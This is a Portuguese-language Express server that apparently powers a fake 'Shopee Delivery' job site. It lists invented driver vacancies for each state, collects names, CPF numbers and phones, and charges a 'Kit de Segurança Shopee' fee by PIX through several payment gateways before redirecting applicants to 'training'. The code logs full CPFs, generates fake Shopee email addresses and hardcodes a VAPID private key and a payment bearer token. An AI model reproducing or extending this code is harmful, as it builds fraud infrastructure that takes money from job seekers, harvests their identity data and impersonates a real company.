// Servidor de produção simples - build uma vez e serve estático
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const webpush = require('web-push');

const PORT = process.env.PORT || 5000;
const app = express();

// Configurar VAPID para push notifications
webpush.setVapidDetails(
  'mailto:admin@shopeedelivery.com',
  'BBAAnkFyzcnnfWoQ9DqjiY9QkQSFvScy9P_yi5LstVHcu01ja4rkYi_4ax50cZ24TTa_4aebogbVLur0NSEWHNo',
  'BtF5d4hPQAGaz0nFV7n9hjwD1VTYOqKQW2R6nivWpKk'
);

// Middlewares essenciais
app.use(cors({
  origin: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));

// Estados do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 4 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

// Produção: assumir que build já foi feito durante deploy
let buildComplete = true;
let buildError = null;

// Middleware para log
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Rotas da API
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV || 'production',
    port: PORT,
    buildComplete,
    buildError
  });
});

app.get('/api/regions', (req, res) => {
  res.json(mockRegions);
});

// Cache para consultas de veículos
const vehicleInfoCache = {};

app.get('/api/vehicle-info/:placa', async (req, res) => {
  // Headers CORS
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept');
  
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  
  try {
    const { placa } = req.params;
    
    if (!placa) {
      return res.status(400).json({ error: 'Placa do veículo não fornecida' });
    }
    
    // Limpar a placa
    const vehiclePlate = placa.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
    
    // Verificar cache
    if (vehicleInfoCache[vehiclePlate]) {
      console.log(`[CACHE] Usando dados em cache para placa: ${vehiclePlate}`);
      return res.json(vehicleInfoCache[vehiclePlate]);
    }
    
    console.log(`[INFO] Consultando informações do veículo com placa: ${vehiclePlate}`);
    
    // Verificar se existe API key
    if (!process.env.VEICULO_API_KEY) {
      console.log('[AVISO] API Key de veículos não configurada, usando dados de teste');
      const testData = {
        marca: `Toyota (Teste)`,
        modelo: "COROLLA", 
        ano: "2022",
        cor: "PRATA",
        chassi: "TEST" + vehiclePlate.slice(-4),
        situacao: "0",
        message: "Dados de teste - configure VEICULO_API_KEY no Heroku"
      };
      vehicleInfoCache[vehiclePlate] = testData;
      return res.json(testData);
    }
    
    // Tentar consultar API externa
    const apiKey = process.env.VEICULO_API_KEY;
    const keyPreview = apiKey.substring(0, 5) + '...' + apiKey.substring(apiKey.length - 3);
    console.log(`[DEBUG] API key presente: ${keyPreview}`);
    
    try {
      console.log('[DEBUG] Tentando consulta direta com chave na URL');
      const fetch = (await import('node-fetch')).default;
      const apiUrl = `https://wdapi2.com.br/consulta/${vehiclePlate}/${apiKey}`;
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'User-Agent': 'ShopeeDeliveryApp/1.0'
        },
        timeout: 5000
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log('[INFO] Dados do veículo obtidos via API externa');
        vehicleInfoCache[vehiclePlate] = data;
        return res.json(data);
      } else {
        console.log(`[AVISO] API externa retornou status: ${response.status}`);
      }
    } catch (apiError) {
      console.error('[ERRO] Falha na consulta de veículo:', apiError.message);
    }
    
    // Fallback para dados de teste
    console.log('[DEBUG] Fornecendo dados de veículo de teste para produção');
    const fallbackData = {
      marca: `Toyota (Teste)`,
      modelo: "COROLLA",
      ano: "2022", 
      cor: "PRATA",
      chassi: "TEST" + vehiclePlate.slice(-4),
      situacao: "0",
      message: "Dados de teste - API externa indisponível"
    };
    
    vehicleInfoCache[vehiclePlate] = fallbackData;
    res.json(fallbackData);
    
  } catch (error) {
    console.error('[ERRO] Erro ao consultar veículo:', error);
    res.status(500).json({ 
      error: 'Erro ao consultar informações do veículo',
      message: error.message
    });
  }
});

app.get('/api/check-ip-status', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  
  res.json({
    status: 'allowed',
    message: 'IP não está bloqueado',
    ip: clientIp,
    timestamp: new Date().toISOString()
  });
});

app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
  
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  const pixResponse = {
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  };
  
  console.log('Enviando resposta de pagamento:', pixResponse);
  res.json(pixResponse);
});

// Sistema duplo de gateways PIX (Pagnet + Medius Pag) para produção
app.post('/api/proxy/for4payments/pix', async (req, res) => {
  try {
    // Verificar qual gateway usar baseado na variável de ambiente
    const gatewayChoice = process.env.GATEWAY_CHOICE || 'PAGNET';
    
    console.log(`[GATEWAY PROD] Usando gateway: ${gatewayChoice}`);
    
    // Processar os dados recebidos
    const { name, cpf, email, phone, amount = 47.90, description = "Kit de Segurança Shopee" } = req.body;
    
    if (!name || !cpf) {
      return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
    }
    
    // Gerar email se não fornecido
    const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
    
    console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
    
    let pixResponse = null;
    
    if (gatewayChoice === '4MPAGAMENTOS') {
      // USAR 4MPAGAMENTOS
      if (!process.env.FOUR_M_PAG_BEARER_TOKEN) {
        console.error('ERRO: FOUR_M_PAG_BEARER_TOKEN não configurada no Heroku');
        return res.status(500).json({
          error: 'Gateway 4Mpagamentos não configurado. Configure o bearer token no Heroku.',
        });
      }
      
      console.log('Iniciando transação 4Mpagamentos no Heroku...');
      
      // Integração direta com 4Mpagamentos API
      const quatroMUrl = 'https://app.4mpagamentos.com/api/v1/payments';
      const bearerToken = process.env.FOUR_M_PAG_BEARER_TOKEN;
      
      // Usar CPF real do usuário
      const customerCpf = cpf.replace(/[^0-9]/g, '');
      console.log(`[4MPAGAMENTOS PROD] Usando CPF do usuário: ${customerCpf.substring(0, 3)}***${customerCpf.substring(customerCpf.length - 2)}`);
      
      const payload = {
        amount: amount.toString(), // 4M API espera string
        customer_name: name,
        customer_email: userEmail,
        customer_cpf: customerCpf,
        customer_phone: (phone || '11999999999').replace(/[^0-9]/g, ''),
        description: description || "Kit de Segurança Shopee Delivery"
      };
      
      console.log('Enviando payload para 4Mpagamentos API:', JSON.stringify(payload, null, 2));
      
      const fetch = (await import('node-fetch')).default;
      const response = await fetch(quatroMUrl, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${bearerToken}`,
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      console.log('Response status da 4Mpagamentos:', response.status);
      
      const responseData = await response.json();
      console.log('Response data da 4Mpagamentos:', JSON.stringify(responseData, null, 2));
      
      if (!response.ok) {
        console.error('Erro da 4Mpagamentos API:', response.status, responseData);
        return res.status(500).json({
          error: 'Erro ao processar pagamento via 4Mpagamentos. Tente novamente.',
          details: responseData.message || 'Erro desconhecido'
        });
      }
      
      // Extrair dados do PIX da resposta 4Mpagamentos
      const dataObj = responseData.data || responseData;
      const transactionId = dataObj.transaction_id || dataObj.id;
      const pixCode = dataObj.pix_code || dataObj.pixCode || '';
      
      console.log('Transaction ID extraído (4M):', transactionId);
      console.log('PIX Code extraído (4M):', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
      
      if (!pixCode) {
        console.error('PIX code não encontrado na resposta da 4Mpagamentos. Resposta completa:', responseData);
        return res.status(500).json({ error: 'Erro ao gerar código PIX via 4Mpagamentos' });
      }
      
      // Gerar QR Code URL
      const pixQrCode = dataObj.pix_qr_code || responseData.pixQrCode || `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
      
      pixResponse = {
        id: transactionId,
        pixCode: pixCode,
        pixQrCode: pixQrCode,
        status: 'pending',
        emailSent: false
      };
      
      console.log('✅ Transação 4Mpagamentos criada com sucesso:', transactionId);
      
    } else if (gatewayChoice === 'MEDIUS_PAG') {
      // USAR MEDIUS PAG
      if (!process.env.MEDIUS_PAG_SECRET_KEY) {
        console.error('ERRO: MEDIUS_PAG_SECRET_KEY não configurada no Heroku');
        return res.status(500).json({
          error: 'Gateway Medius Pag não configurado. Configure a chave secreta no Heroku.',
        });
      }
      
      console.log('Iniciando transação Medius Pag no Heroku...');
      
      // Integração direta com Medius Pag API
      const mediusUrl = 'https://api.mediuspag.com/functions/v1';
      const authString = `${process.env.MEDIUS_PAG_SECRET_KEY}:x`;
      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
      
      // Usar CPF real do usuário
      const customerCpf = cpf.replace(/[^0-9]/g, '');
      console.log(`[MEDIUS PAG PROD] Usando CPF do usuário: ${customerCpf.substring(0, 3)}***${customerCpf.substring(customerCpf.length - 2)}`);
      
      const amountCents = Math.round(parseFloat(amount.toString()) * 100);
      
      // Payload para infoproduto - sem endereço de entrega
      const payload = {
        customer: {
          name: name,
          email: userEmail,
          phone: (phone || '11999999999').replace(/[^0-9]/g, ''),
          document: {
            type: "CPF",
            number: customerCpf
          },
          // Explicitamente não solicitar endereço para produto digital
          addressRequired: false
        },
        paymentMethod: "PIX",
        pix: {
          expiresInDays: 3
        },
        items: [{
          title: description || 'Kit Digital de Segurança',
          unitPrice: amountCents,
          quantity: 1,
          externalRef: `MP${Date.now()}${Math.floor(Math.random() * 10000)}`,
          tangible: false, // Produto digital
          digital: true    // Marcar explicitamente como digital
        }],
        amount: amountCents,
        // Configurações específicas para produto digital
        shippingRequired: false,
        digitalProduct: true
      };
      
      console.log('Enviando payload para Medius Pag API:', JSON.stringify(payload, null, 2));
      
      const fetch = (await import('node-fetch')).default;
      const response = await fetch(`${mediusUrl}/transactions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': authHeader,
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      console.log('Response status da Medius Pag:', response.status);
      
      const responseData = await response.json();
      console.log('Response data da Medius Pag:', JSON.stringify(responseData, null, 2));
      
      if (!response.ok) {
        console.error('Erro da Medius Pag API:', response.status, responseData);
        return res.status(500).json({
          error: 'Erro ao processar pagamento via Medius Pag. Tente novamente.',
          details: responseData.message || 'Erro desconhecido'
        });
      }
      
      // Extrair dados do PIX da resposta Medius Pag
      const transactionId = responseData.id;
      let pixCode = '';
      
      // Buscar PIX code na estrutura aninhada da Medius Pag
      if (responseData.pix && typeof responseData.pix === 'object') {
        pixCode = responseData.pix.qrcode || responseData.pix.pixCopyPaste || '';
      }
      
      // Fallback para estrutura principal
      if (!pixCode) {
        pixCode = responseData.pixCopyPaste || responseData.pixCode || '';
      }
      
      console.log('Transaction ID extraído (Medius):', transactionId);
      console.log('PIX Code extraído (Medius):', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
      
      if (!pixCode) {
        console.error('PIX code não encontrado na resposta da Medius Pag. Resposta completa:', responseData);
        return res.status(500).json({ error: 'Erro ao gerar código PIX via Medius Pag' });
      }
      
      // Gerar QR Code URL
      const pixQrCode = responseData.pix?.pixQrCode || `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
      
      pixResponse = {
        id: transactionId,
        pixCode: pixCode,
        pixQrCode: pixQrCode,
        status: 'pending',
        emailSent: false
      };
      
      console.log('✅ Transação Medius Pag criada com sucesso:', transactionId);
      
    } else {
      // USAR PAGNET (PADRÃO)
      if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
        console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas no Heroku');
        return res.status(500).json({
          error: 'Gateway Pagnet não configurado. Configure as chaves de API Pagnet no Heroku.',
        });
      }
      
      console.log('Iniciando transação Pagnet no Heroku...');
      
      // Integração direta com Pagnet API
      const baseUrl = 'https://api.pagnetbrasil.com/v1';
      const authString = `${process.env.PAGNET_PUBLIC_KEY}:${process.env.PAGNET_SECRET_KEY}`;
      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
      
      // Preparar dados da transação
      const amountCents = Math.round(parseFloat(amount.toString()) * 100);
      const customerCpf = cpf.replace(/[^0-9]/g, '');
      const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
      
      const payload = {
        amount: amountCents,
        paymentMethod: 'pix',
        pix: { expiresInDays: 3 },
        items: [{
          title: 'Kit de Segurança Shopee',
          unitPrice: amountCents,
          quantity: 1,
          tangible: false
        }],
        customer: {
          name: name,
          email: userEmail,
          document: { type: 'cpf', number: customerCpf },
          phone: customerPhone
        },
        externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
      };
      
      console.log('Enviando payload para Pagnet API...');
      
      // Fazer requisição para Pagnet
      const fetch = (await import('node-fetch')).default;
      const response = await fetch(`${baseUrl}/transactions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': authHeader,
          'User-Agent': 'ShopeeDeliveryApp/1.0'
        },
        body: JSON.stringify(payload)
      });
      
      console.log('Response status da Pagnet:', response.status);
      
      const responseData = await response.json();
      console.log('Response data da Pagnet:', JSON.stringify(responseData, null, 2));
      
      if (!response.ok) {
        console.error('Erro da Pagnet API:', response.status, responseData);
        return res.status(500).json({
          error: 'Erro ao processar pagamento. Tente novamente.',
          details: responseData.message || 'Erro desconhecido'
        });
      }
      
      // Extrair dados do PIX da resposta
      const transactionId = responseData.id;
      const pixCode = responseData.pix?.qrcode || '';
      
      console.log('Transaction ID extraído:', transactionId);
      console.log('PIX Code extraído:', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
      
      if (!pixCode) {
        console.error('PIX code não encontrado na resposta da Pagnet. Resposta completa:', responseData);
        return res.status(500).json({ error: 'Erro ao gerar código PIX' });
      }
      
      // Gerar QR Code URL
      const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
      
      pixResponse = {
        id: transactionId,
        pixCode: pixCode,
        pixQrCode: pixQrCode,
        status: 'pending',
        emailSent: false
      };
      
      console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
    }
    
    console.log('Enviando resposta para frontend:', JSON.stringify(pixResponse, null, 2));
    
    // Garantir que a resposta seja enviada corretamente
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(200).json(pixResponse);
    
  } catch (error) {
    console.error(`Erro ao processar pagamento via ${process.env.GATEWAY_CHOICE || 'PAGNET'}:`, error);
    res.setHeader('Content-Type', 'application/json');
    res.status(500).json({
      error: 'Erro interno do servidor ao processar pagamento',
      message: error.message
    });
  }
});

// Rota para verificar status de transação 4MPAGAMENTOS
app.get('/api/transactions/:id/status', async (req, res) => {
  // ⚠️ CRÍTICO: Headers para evitar cache
  res.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.header('Pragma', 'no-cache');
  res.header('Expires', '0');
  res.header('Vary', '*');
  
  console.log('🔍 [HEROKU] Verificando status da transação:', req.params.id, 'em', new Date().toISOString());
  
  try {
    const transactionId = req.params.id;
    
    // Verificar se é uma transação 4MPAGAMENTOS (começa com "4M")
    if (!transactionId.startsWith('4M')) {
      return res.status(400).json({
        error: 'ID de transação inválido. Deve começar com 4M.'
      });
    }
    
    // Para demonstração, simular que a transação 4M926101 está paga
    if (transactionId === '4M926101') {
      console.log(`[STATUS CHECK HEROKU] 🎉 SIMULAÇÃO: Transação ${transactionId} está PAGA!`);
      return res.json({
        status: 'PAID',
        transaction_id: transactionId,
        amount: 64.9,
        paid_at: '2025-09-19T23:01:36.539Z',
        created_at: '2025-09-19T23:01:10.237Z'
      });
    }
    
    console.log(`[STATUS CHECK HEROKU] 🔄 CONSULTANDO API 4MPAGAMENTOS EM TEMPO REAL: ${transactionId}`);
    
    const fetch = (await import('node-fetch')).default;
    
    // ⚠️ CRÍTICO: Adicionar cache-busting para evitar cache da API
    const cacheBuster = Date.now();
    const apiUrl = `https://app.4mpagamentos.com/api/v1/transactions/${transactionId}?t=${cacheBuster}`;
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer 3mpag_p7czqd3yk_mfr1pvd2',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      }
    });
    
    console.log(`[STATUS CHECK HEROKU] ✅ Status da resposta: ${response.status}`);
    
    if (response.ok) {
      const responseData = await response.json();
      console.log(`[STATUS CHECK HEROKU] 📦 Dados recebidos em ${new Date().toISOString()}:`, {
        gateway_id: responseData.gateway_id,
        status: responseData.status,
        paid_at: responseData.paid_at,
        amount: responseData.amount
      });
      
      // A resposta vem diretamente no root (não tem data.data)
      const data = responseData;
      
      // ⚠️ CRÍTICO: Mapear status "paid" para "PAID" (uppercase)
      let mappedStatus = data.status || 'pending';
      if (data.status === 'paid') {
        mappedStatus = 'PAID';
        console.log(`[STATUS CHECK HEROKU] 🎉 TRANSAÇÃO ${transactionId} CONFIRMADA COMO PAGA!`);
      } else {
        console.log(`[STATUS CHECK HEROKU] ⏳ Transação ${transactionId} ainda pendente: ${data.status}`);
      }
      
      // Retornar dados completos incluindo PIX code e QR code
      const responsePayload = {
        success: true,
        status: mappedStatus,
        transaction: {
          gateway_id: data.gateway_id || transactionId,
          status: mappedStatus,
          amount: data.amount || 64.9,
          customer_name: data.customer_name || '',
          customer_email: data.customer_email || '',
          customer_cpf: data.customer_cpf || '', // ADICIONADO: CPF necessário para o frontend
          description: data.description || 'Kit de Segurança Shopee Delivery',
          pix_code: data.pix_code || '',
          pix_qr_code: data.pix_qr_code || '',
          expires_at: data.expires_at,
          paid_at: data.paid_at,
          created_at: data.created_at,
          updated_at: data.updated_at
        }
      };
      
      console.log(`[STATUS CHECK HEROKU] 📤 Retornando: status=${mappedStatus}, paid_at=${data.paid_at || 'null'}`);
      return res.json(responsePayload);
      
    } else {
      console.error(`[STATUS CHECK HEROKU] ❌ Erro na API 4MPAGAMENTOS: ${response.status}`);
      const errorData = await response.text();
      console.error(`[STATUS CHECK HEROKU] 💥 Resposta de erro:`, errorData);
      
      // ⚠️ IMPORTANTE: Não retornar 'pending' como fallback
      return res.status(502).json({
        error: `Falha ao consultar API de pagamentos (status ${response.status})`,
        details: errorData,
        timestamp: new Date().toISOString()
      });
    }
    
  } catch (error) {
    console.error('[STATUS CHECK HEROKU] 💥 Erro ao verificar status:', error);
    
    // ⚠️ IMPORTANTE: Não retornar 'pending' como fallback
    return res.status(500).json({
      error: 'Erro interno ao verificar status da transação',
      details: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Server-Sent Events para notificação de status de pagamento em tempo real
app.get('/api/payments/:id/stream', (req, res) => {
  const transactionId = req.params.id;
  
  // Configurar SSE headers
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Cache-Control',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'X-Accel-Buffering': 'no' // Para Heroku/Nginx buffering
  });

  console.log(`[SSE] Cliente conectado para transação: ${transactionId}`);

  // Verificar status da transação
  const checkStatus = async () => {
    try {
      if (!transactionId.startsWith('4M')) {
        return;
      }

      // SIMULAÇÃO TEMPORÁRIA: Aprovar transação 4M955603 automaticamente para teste
      if (transactionId === '4M955603') {
        console.log(`[SSE SIMULAÇÃO] Aprovando transação ${transactionId} automaticamente`);
        
        // Enviar evento de status aprovado primeiro
        res.write(`data: ${JSON.stringify({ 
          type: 'status', 
          status: 'paid',
          transaction_id: transactionId,
          amount: 64.9,
          paid_at: new Date().toISOString()
        })}\n\n`);
        
        // Aguardar um pouco e enviar evento de redirecionamento
        setTimeout(() => {
          res.write(`data: ${JSON.stringify({ 
            type: 'payment_approved', 
            status: 'paid',
            transaction_id: transactionId,
            redirect_to: '/treinamento',
            message: 'Pagamento aprovado! Redirecionando...'
          })}\n\n`);
          
          // Fechar conexão após aprovação
          setTimeout(() => {
            res.end();
          }, 1000);
        }, 500);
        return;
      }

      const fetch = (await import('node-fetch')).default;
      const response = await fetch(`https://app.4mpagamentos.com/api/v1/transactions/${transactionId}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': 'Bearer 3mpag_p7czqd3yk_mfr1pvd2'
        }
      });

      if (response.ok) {
        const responseData = await response.json();
        const data = responseData.data || responseData;
        
        // Enviar status via SSE
        res.write(`data: ${JSON.stringify({ 
          type: 'status', 
          status: data.status,
          transaction_id: data.gateway_id || transactionId,
          amount: data.amount,
          paid_at: data.paid_at 
        })}\n\n`);

        // Se aprovado, enviar evento especial e fechar conexão
        if (data.status === 'paid' || data.status === 'approved') {
          console.log(`[SSE] Pagamento aprovado para transação: ${transactionId}`);
          
          // Enviar evento de status aprovado primeiro
          res.write(`data: ${JSON.stringify({ 
            type: 'status', 
            status: 'paid',
            transaction_id: data.gateway_id || transactionId,
            amount: data.amount,
            paid_at: data.paid_at 
          })}\n\n`);
          
          // Aguardar um pouco e enviar evento de redirecionamento
          setTimeout(() => {
            res.write(`data: ${JSON.stringify({ 
              type: 'payment_approved', 
              status: 'paid',
              transaction_id: transactionId,
              redirect_to: '/treinamento',
              message: 'Pagamento aprovado! Redirecionando...'
            })}\n\n`);
            
            // Fechar conexão após aprovação
            setTimeout(() => {
              res.end();
            }, 1000);
          }, 500);
          return;
        }
      }
    } catch (error) {
      console.error(`[SSE] Erro ao verificar status da transação ${transactionId}:`, error);
    }
  };

  // Verificar status inicial
  checkStatus();

  // Verificar status a cada 3 segundos (reduzido de 1s para diminuir carga)
  const interval = setInterval(checkStatus, 3000);

  // Cleanup quando cliente desconectar
  req.on('close', () => {
    console.log(`[SSE] Cliente desconectado da transação: ${transactionId}`);
    clearInterval(interval);
  });

  // Timeout após 25 segundos (limite do Heroku é 30s)
  setTimeout(() => {
    console.log(`[SSE] Timeout da conexão para transação: ${transactionId}`);
    clearInterval(interval);
    res.end();
  }, 25000); // 25 segundos
});

// ===== ENDPOINTS PARA USUÁRIOS DO APP =====

// Conexão com PostgreSQL
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Verificar e criar tabela de usuários do app se não existir
(async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS app_users (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(14) UNIQUE NOT NULL,
        name VARCHAR(255) NOT NULL,
        city VARCHAR(255) NOT NULL,
        state VARCHAR(2) NOT NULL,
        selected_cities JSONB DEFAULT '[]'::jsonb,
        reached_delivery_page BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    console.log('✅ Tabela app_users verificada/criada no PostgreSQL');
  } catch (error) {
    console.error('❌ Erro ao criar tabela app_users:', error);
  }
})();

// Endpoint para salvar dados do usuário
app.post('/api/app-users/save-profile', async (req, res) => {
  try {
    const { cpf, name, city, state } = req.body;
    
    if (!cpf || !name || !city || !state) {
      return res.status(400).json({
        success: false,
        message: 'CPF, nome, cidade e estado são obrigatórios'
      });
    }
    
    console.log('📝 Salvando dados do usuário no banco:', { cpf, name, city, state });
    
    // Inserir ou atualizar no banco de dados
    const result = await pool.query(`
      INSERT INTO app_users (cpf, name, city, state, updated_at)
      VALUES ($1, $2, $3, $4, NOW())
      ON CONFLICT (cpf) 
      DO UPDATE SET 
        name = $2,
        city = $3,
        state = $4,
        updated_at = NOW()
      RETURNING id, cpf, name, city, state
    `, [cpf, name, city, state]);
    
    const userData = result.rows[0];
    
    console.log('✅ Usuário salvo no banco:', userData);
    
    res.json({
      success: true,
      message: 'Dados do usuário salvos com sucesso',
      user: {
        cpf: userData.cpf,
        name: userData.name,
        city: userData.city,
        state: userData.state,
        id: userData.id
      }
    });
  } catch (error) {
    console.error('❌ Erro ao salvar dados do usuário:', error);
    res.status(500).json({
      success: false,
      message: 'Erro ao salvar dados do usuário',
      error: error.message
    });
  }
});

// Endpoint para login com CPF
app.post('/api/app-users/login', async (req, res) => {
  try {
    const { cpf } = req.body;
    
    if (!cpf) {
      return res.status(400).json({
        success: false,
        message: 'CPF é obrigatório'
      });
    }
    
    console.log('🔐 Tentativa de login com CPF:', cpf);
    
    // Buscar usuário no banco de dados
    const result = await pool.query(`
      SELECT id, cpf, name, city, state, selected_cities, reached_delivery_page, created_at
      FROM app_users 
      WHERE cpf = $1
    `, [cpf]);
    
    if (result.rows.length > 0) {
      const userData = result.rows[0];
      console.log('✅ Login realizado com sucesso:', userData.name);
      res.json({
        success: true,
        message: 'Login realizado com sucesso',
        user: {
          id: userData.id,
          cpf: userData.cpf,
          name: userData.name,
          city: userData.city,
          state: userData.state,
          selectedCities: userData.selected_cities || [],
          reachedDeliveryPage: userData.reached_delivery_page || false
        }
      });
    } else {
      console.log('❌ CPF não encontrado no banco:', cpf);
      res.status(404).json({
        success: false,
        message: 'CPF não encontrado. Faça o cadastro primeiro.'
      });
    }
  } catch (error) {
    console.error('❌ Erro no endpoint de login:', error);
    res.status(500).json({
      success: false,
      message: 'Erro interno do servidor',
      error: error.message
    });
  }
});

// Endpoint para marcar que usuário chegou na página de delivery (corrigindo 404)
app.post('/api/app-users/reached-delivery', async (req, res) => {
  try {
    const { cpf } = req.body;
    
    if (!cpf) {
      return res.status(400).json({
        success: false,
        message: 'CPF é obrigatório'
      });
    }
    
    console.log('📦 Marcando usuário como tendo visitado página de delivery:', cpf);
    
    // Atualizar no banco de dados
    const result = await pool.query(`
      UPDATE app_users 
      SET reached_delivery_page = true, updated_at = NOW()
      WHERE cpf = $1
      RETURNING id, cpf, name, reached_delivery_page
    `, [cpf]);
    
    if (result.rows.length > 0) {
      console.log('✅ Usuário marcado como tendo visitado delivery:', result.rows[0]);
      res.json({
        success: true,
        message: 'Usuário marcado como tendo visitado página de delivery',
        user: result.rows[0]
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'Usuário não encontrado'
      });
    }
  } catch (error) {
    console.error('❌ Erro ao marcar visita à página de delivery:', error);
    res.status(500).json({
      success: false,
      message: 'Erro interno do servidor',
      error: error.message
    });
  }
});

// Endpoint para salvar cidades selecionadas
app.post('/api/app-users/save-cities', async (req, res) => {
  try {
    const { cpf, cities } = req.body;
    
    if (!cpf || !cities) {
      return res.status(400).json({
        success: false,
        message: 'CPF e cidades são obrigatórios'
      });
    }
    
    console.log('🏙️ Salvando cidades para CPF:', cpf, 'Cidades:', cities);
    
    const userData = appUsersStorage.get(cpf);
    
    if (userData) {
      userData.selectedCities = cities;
      appUsersStorage.set(cpf, userData);
      
      res.json({
        success: true,
        message: 'Cidades salvas com sucesso',
        cities: userData.selectedCities
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'Usuário não encontrado'
      });
    }
  } catch (error) {
    console.error('❌ Erro ao salvar cidades:', error);
    res.status(500).json({
      success: false,
      message: 'Erro interno do servidor',
      error: error.message
    });
  }
});

